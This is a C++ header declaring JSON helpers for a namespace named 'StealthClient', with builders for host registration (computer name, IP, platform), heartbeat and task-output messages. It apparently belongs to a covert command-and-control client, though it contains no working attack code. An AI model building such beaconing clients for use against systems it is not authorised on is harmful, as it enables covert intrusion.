#pragma once
#include <string>
#include <map>
#include <vector>

namespace StealthClient {

// Simple JSON utilities for basic message handling
class JsonUtils {
public:
    // Simple JSON object representation
    struct JsonObject {
        std::map<std::string, std::string> strings;
        std::map<std::string, int> integers;
        std::map<std::string, bool> booleans;
        std::map<std::string, std::vector<std::string>> arrays;
    };

    // Convert JsonObject to JSON string
    static std::string ToString(const JsonObject& obj);
    
    // Parse JSON string to JsonObject (simple implementation)
    static JsonObject FromString(const std::string& json);
    
    // Helper methods for common message types
    static std::string CreateRegisterMessage(const std::string& uuid, const std::string& computerName, const std::string& ipAddress, const std::string& platform);
    static std::string CreateHeartbeatMessage(const std::string& uuid);
    static std::string CreateOutputMessage(const std::string& taskId, const std::string& output, const std::string& status);
    
    // Parse incoming messages
    static std::string GetMessageType(const std::string& json);
    static std::string GetStringField(const std::string& json, const std::string& field);
    static int GetIntField(const std::string& json, const std::string& field);
    static bool GetBoolField(const std::string& json, const std::string& field);

private:
    static std::string EscapeString(const std::string& str);
    static std::string UnescapeString(const std::string& str);
    static std::string Trim(const std::string& str);
};

} // namespace StealthClient
